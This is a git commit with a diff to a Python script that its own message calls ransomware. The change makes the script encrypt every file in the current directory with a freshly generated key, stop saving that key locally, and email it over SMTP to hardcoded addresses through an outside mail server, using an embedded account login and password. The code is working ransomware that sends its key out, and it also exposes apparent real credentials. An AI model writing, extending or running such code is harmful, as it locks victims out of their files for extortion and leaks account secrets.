8fc515f25e131fd0aa3c2c30a0ef92bdeb5d1cc2
JaschaHaifetz <lilko.petkovv@gmail.com>
2022-08-16 16:12:03 +0300

    Ransomware updated with SMTP setup. The key would be sent to an email of the user's choosing.

--- my_file.py
+++ my_file.py
@@ -1,3 +1,4 @@
+import smtplib
 import os
 from cryptography.fernet import Fernet
 
@@ -11,14 +12,38 @@ for file in os.listdir():
         files.append(file)
 
 key = Fernet.generate_key()
-
-with open("thekey.key", "wb") as thekey:
-    thekey.write(key)
+key = key.decode('utf-8')
 
 for file in files:
     with open(file, "rb") as thefile:
         contents = thefile.read()
     contents_encrypted = Fernet(key).encrypt(contents)
-    
+
     with open (file, "wb") as thefile:
         thefile.write(contents_encrypted)
+
+gmail_user = 'info@sportcentre.info'
+gmail_password = '(df1v3L^}12n'
+
+sent_from = gmail_user
+to = ['lilko.petkovv@gmail.com', 'lilkoo.petkovv@gmail.com']
+subject = f'Ransomware key'
+body = key
+
+email_text = """\
+From: %s
+To: %s
+Subject: %s
+
+%s
+""" % (sent_from, ", ".join(to), subject, body)
+
+try:
+    smtp_server = smtplib.SMTP_SSL('mail.sportcentre.info', 465)
+    smtp_server.ehlo()
+    smtp_server.login(gmail_user, gmail_password)
+    smtp_server.sendmail(sent_from, to, email_text)
+    smtp_server.close()
+    print ("Email sent successfully!")
+except Exception as ex:
+    print ("Something went wrong….",ex)
